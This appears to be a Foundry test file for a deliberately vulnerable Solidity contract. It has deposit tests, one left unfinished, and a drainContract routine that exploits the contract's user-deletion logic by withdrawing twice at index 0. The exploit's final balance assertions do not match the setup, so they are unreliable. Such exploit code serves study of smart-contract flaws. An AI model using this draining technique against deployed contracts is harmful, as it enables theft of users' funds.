pragma solidity 0.8.15;

import "forge-std/test.sol";
import "../src/DeleteUser.sol";

contract DeleteUserTest is Test {
    DeleteUser public deleteUser;

    address player = vm.addr(1);

    struct User {
        address addr;
        uint256 balance;
    }

    function setUp() public {
        // Deposit 1 ether
        deleteUser = new DeleteUser();
        vm.deal(player, 1 ether);
    }

    function testDeposit() public {
        vm.prank(player);
        deleteUser.deposit{value: 1 ether}();
        assertEq(address(deleteUser).balance, 1 ether);
    }

    function testNewUserCreated() public {
        vm.prank(player);
        deleteUser.deposit{value: 1 ether}();
        User memory user1 = User(player, 1 ether);
        // TO DO assertion equality 
    }

    function drainContract() public {
        vm.startPrank(player);
        deleteUser.deposit{value: 1 ether}();
        deleteUser.deposit{value : 0 ether}();

        // Withdraw with index(0) 2 times 
        deleteUser.withdraw(0); // removes User that deposited 0 ether (last item in array)
        deleteUser.withdraw(0); // removes User that deposited 1 ether (last item in array)

        assertEq(address(deleteUser).balance, 0);
        assertEq(player.balance, 2 ether);

    }
}
